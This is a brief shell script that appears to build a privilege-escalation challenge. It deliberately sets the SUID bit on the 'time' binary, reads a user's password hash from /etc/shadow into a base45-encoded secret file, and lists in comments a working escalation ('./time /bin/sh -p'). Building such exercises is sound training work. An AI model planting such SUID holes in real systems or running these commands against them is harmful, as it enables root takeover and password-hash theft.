USER = user
# login as a root

#install time
apt install time
chmod u+s $(which time)

adduser $USER sudo

su - $USER


pip3 install base45 # or pip3 install base45 --break-system-packages

#copying user's password and coding it in base45
sudo grep $USER /etc/shadow | python3 -c "import base45, sys; print(base45.b45encode(sys.stdin.read().encode()).decode())" > secret.txt

#exploit (in home dir of the user)
# sudo install -m =xs $(which time) .

# ./time /bin/sh -p